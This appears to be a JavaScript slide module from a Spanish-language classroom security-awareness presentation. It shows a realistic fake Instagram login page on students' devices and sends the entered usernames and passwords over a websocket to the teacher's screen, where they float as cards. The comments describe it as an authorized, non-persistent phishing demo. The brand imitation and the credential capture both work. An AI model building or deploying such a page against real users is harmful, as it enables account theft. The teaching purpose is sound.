/* ===========================================================
   Paso 4 (índice 3) — "Instagram falso"
   Demo de phishing en vivo (educativa, autorizada, en el dominio
   del profe; los datos NO se guardan en disco). El alumno ve un
   login estilo Instagram; el profe ve las capturas FLOTANDO y
   subiendo por toda la pantalla.
   =========================================================== */
(() => {
  'use strict';

  let submitted = false; // estado local del alumno

  // glifo real de Instagram (cámara con degradado) + wordmark
  const IG_LOGO = `
    <svg class="paso4-glyph" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
      <defs>
        <radialGradient id="paso4-ig" cx="30%" cy="107%" r="140%">
          <stop offset="0%" stop-color="#fdf497"/>
          <stop offset="8%" stop-color="#fdf497"/>
          <stop offset="45%" stop-color="#fd5949"/>
          <stop offset="60%" stop-color="#d6249f"/>
          <stop offset="90%" stop-color="#285aeb"/>
        </radialGradient>
      </defs>
      <rect x="16" y="16" width="480" height="480" rx="122" fill="url(#paso4-ig)"/>
      <rect x="146" y="146" width="220" height="220" rx="64" fill="none" stroke="#fff" stroke-width="26"/>
      <circle cx="256" cy="256" r="60" fill="none" stroke="#fff" stroke-width="26"/>
      <circle cx="352" cy="160" r="18" fill="#fff"/>
    </svg>`;

  function brand() {
    return `<div class="paso4-brand">${IG_LOGO}<div class="paso4-word">Instagram</div></div>`;
  }

  // ---- overlay flotante del profe (vive en <body>, sobrevive al re-render) ----
  let overlay = null, guard = null, ctxRef = null;
  const seen = new Set();

  function ensureOverlay() {
    if (!overlay) {
      overlay = document.createElement('div');
      overlay.className = 'paso4-overlay';
      document.body.appendChild(overlay);
    }
    if (!guard) {
      guard = setInterval(() => { if (!ctxRef || ctxRef.S.slide !== 3) teardown(); }, 400);
    }
  }
  function teardown() {
    if (guard) { clearInterval(guard); guard = null; }
    if (overlay) { overlay.remove(); overlay = null; }
    seen.clear();
  }
  function spawnCard(ctx, c) {
    if (!overlay) return;
    const el = document.createElement('div');
    el.className = 'paso4-card';
    const dur = 9 + Math.random() * 5;
    el.style.left = (6 + Math.random() * 80) + '%';
    el.style.setProperty('--drift', Math.round((Math.random() - 0.5) * 170) + 'px');
    el.style.setProperty('--rot', Math.round((Math.random() - 0.5) * 12) + 'deg');
    el.style.animationDuration = dur.toFixed(1) + 's';
    el.style.animationDelay = (-Math.random() * dur).toFixed(1) + 's'; // fase distinta → flujo continuo
    el.innerHTML = `
      <div class="paso4-card-name">${ctx.icon('user', { size: 15 })}${ctx.escapeHtml(c.name || 'Anónimo')}</div>
      <div class="paso4-card-cred">
        <span class="paso4-card-user">${ctx.escapeHtml(c.user || '')}</span>
        <span class="paso4-card-pass">${ctx.escapeHtml(c.pass || '')}</span>
      </div>`;
    overlay.appendChild(el); // queda en loop (no se elimina)
  }

  window.BARNA_SLIDES = window.BARNA_SLIDES || {};
  window.BARNA_SLIDES[3] = {
    // ---------- ALUMNO: login falso a pantalla completa ----------
    student(container, ctx) {
      if (submitted) return showWaiting(container);
      container.innerHTML = `
        <div class="paso4-ig">
          <div class="paso4-ig-inner">
            ${brand()}
            <input class="paso4-in" id="paso4-user" type="text" placeholder="Teléfono, usuario o correo" autocomplete="off" autocapitalize="none" spellcheck="false" />
            <input class="paso4-in" id="paso4-pass" type="password" placeholder="Contraseña" autocomplete="off" />
            <button class="paso4-ig-btn" id="paso4-go" disabled>Iniciar sesión</button>
            <a class="paso4-forgot" href="#" id="paso4-forgot">¿Olvidaste tu contraseña?</a>
          </div>
        </div>`;
      const inner = container.querySelector('.paso4-ig-inner');
      const userEl = container.querySelector('#paso4-user');
      const passEl = container.querySelector('#paso4-pass');
      const btn = container.querySelector('#paso4-go');
      const sync = () => { btn.disabled = !(userEl.value.trim() && passEl.value.trim()); };
      userEl.addEventListener('input', sync);
      passEl.addEventListener('input', sync);
      container.querySelector('#paso4-forgot').addEventListener('click', (e) => e.preventDefault());
      const submit = (e) => {
        if (e) e.preventDefault();
        const user = userEl.value.trim(); const pass = passEl.value;
        if (!user || !pass.trim() || submitted) return;
        submitted = true;
        ctx.sendWs({ type: 'capture', user, pass });
        renderWaiting(inner);
      };
      btn.addEventListener('click', submit);
      passEl.addEventListener('keydown', (ev) => { if (ev.key === 'Enter' && !btn.disabled) submit(ev); });
    },

    // ---------- PROFE: capturas flotando por toda la pantalla ----------
    presenter(container, ctx) {
      ctxRef = ctx;
      const n = (ctx.cache.captures || []).length;
      container.innerHTML = `
        <div class="slide paso4-pres">
          <div class="kicker">${ctx.icon('eye', { size: 14 })} En vivo</div>
          <h2 class="q">Lo que están escribiendo <span class="hl">ahora mismo</span>…</h2>
          <p class="paso4-hint">${n ? `${n} ${n === 1 ? 'persona ya escribió sus datos' : 'personas ya escribieron sus datos'}` : 'Esperando a que entren sus datos…'}</p>
        </div>`;
      ensureOverlay();
      (ctx.cache.captures || []).forEach((c) => {
        const key = (c.id || '') + '|' + (c.at || '');
        if (!seen.has(key)) { seen.add(key); spawnCard(ctx, c); }
      });
    },

    css: `
      /* ---- ALUMNO: recreación de login Instagram ---- */
      .paso4-ig {
        position: fixed; inset: 0; z-index: 45; background: #fff; color: #262626;
        display: flex; flex-direction: column; align-items: center; justify-content: center;
        padding: 40px 28px calc(env(safe-area-inset-bottom, 0px) + 40px);
        font-family: -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      }
      .paso4-ig-inner { width: 100%; max-width: 350px; display: flex; flex-direction: column; align-items: stretch; gap: 11px; }
      .paso4-brand { display: flex; flex-direction: column; align-items: center; gap: 14px; margin-bottom: 26px; }
      .paso4-glyph { width: 62px; height: 62px; filter: drop-shadow(0 6px 16px rgba(214,36,159,0.25)); }
      .paso4-word { font-family: 'Grand Hotel', 'Brush Script MT', 'Segoe Script', 'Snell Roundhand', cursive; font-size: 44px; color: #262626; line-height: 1; }
      /* font-size 16px evita el auto-zoom de iOS al enfocar el campo */
      .paso4-in { width: 100%; padding: 13px 12px; font-size: 16px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 6px; color: #262626; outline: none; font-family: inherit; }
      .paso4-in:focus { border-color: #a8a8a8; background: #fff; }
      .paso4-in::placeholder { color: #8e8e8e; }
      .paso4-ig-btn { width: 100%; margin-top: 6px; padding: 13px; border: none; border-radius: 8px; background: #0095f6; color: #fff; font-weight: 700; font-size: 1rem; font-family: inherit; cursor: pointer; transition: opacity 0.15s; }
      .paso4-ig-btn:disabled { opacity: 0.4; cursor: default; }
      .paso4-forgot { text-align: center; margin-top: 20px; font-size: 0.82rem; color: #00376b; text-decoration: none; }
      .paso4-wait { display: flex; flex-direction: column; align-items: center; gap: 18px; }
      .paso4-spinner { width: 34px; height: 34px; border-radius: 50%; border: 3px solid #dbdbdb; border-top-color: #0095f6; animation: paso4-spin 0.9s linear infinite; }
      @keyframes paso4-spin { to { transform: rotate(360deg); } }
      .paso4-wait-txt { color: #8e8e8e; font-size: 0.92rem; }

      /* ---- PROFE: overlay flotante ---- */
      .paso4-pres .paso4-hint { color: var(--muted); font-family: var(--display); font-weight: 600; font-size: 1.15rem; margin-top: 6px; }
      .paso4-overlay { position: fixed; inset: 0; z-index: 25; pointer-events: none; overflow: hidden; }
      .paso4-card {
        position: absolute; bottom: 0; pointer-events: none; opacity: 0;
        background: var(--surface); border: 1px solid var(--line); border-radius: 16px;
        box-shadow: var(--shadow); padding: 12px 16px; min-width: 190px; max-width: 280px;
        animation: paso4-rise linear infinite;
      }
      @keyframes paso4-rise {
        0%   { transform: translateY(22vh) translateX(0) rotate(var(--rot,0deg)); opacity: 0; }
        9%   { opacity: 1; }
        88%  { opacity: 1; }
        100% { transform: translateY(-118vh) translateX(var(--drift,0px)) rotate(calc(var(--rot,0deg) * -1)); opacity: 0; }
      }
      .paso4-card-name { display: inline-flex; align-items: center; gap: 6px; font-family: var(--display); font-weight: 700; font-size: 0.98rem; color: var(--navy); }
      .paso4-card-name .ic { color: var(--blue); }
      .paso4-card-cred { margin-top: 5px; font-family: var(--mono); font-size: 0.88rem; display: flex; gap: 8px; flex-wrap: wrap; }
      .paso4-card-user { color: var(--navy); font-weight: 700; overflow-wrap: anywhere; }
      .paso4-card-pass { color: var(--red); font-weight: 700; overflow-wrap: anywhere; }

      @media (max-width: 620px) {
        .paso4-ig { padding: 32px 22px calc(env(safe-area-inset-bottom, 0px) + 32px); }
        .paso4-glyph { width: 56px; height: 56px; }
        .paso4-word { font-size: 40px; }
        .paso4-brand { margin-bottom: 22px; }
      }
    `,
  };

  // -------- helpers del alumno --------
  function renderWaiting(inner) {
    inner.innerHTML = `${brand()}<div class="paso4-wait"><div class="paso4-spinner"></div><div class="paso4-wait-txt">Iniciando sesión…</div></div>`;
  }
  function showWaiting(container) {
    container.innerHTML = `<div class="paso4-ig"><div class="paso4-ig-inner">${brand()}<div class="paso4-wait"><div class="paso4-spinner"></div><div class="paso4-wait-txt">Iniciando sesión…</div></div></div></div>`;
  }
})();
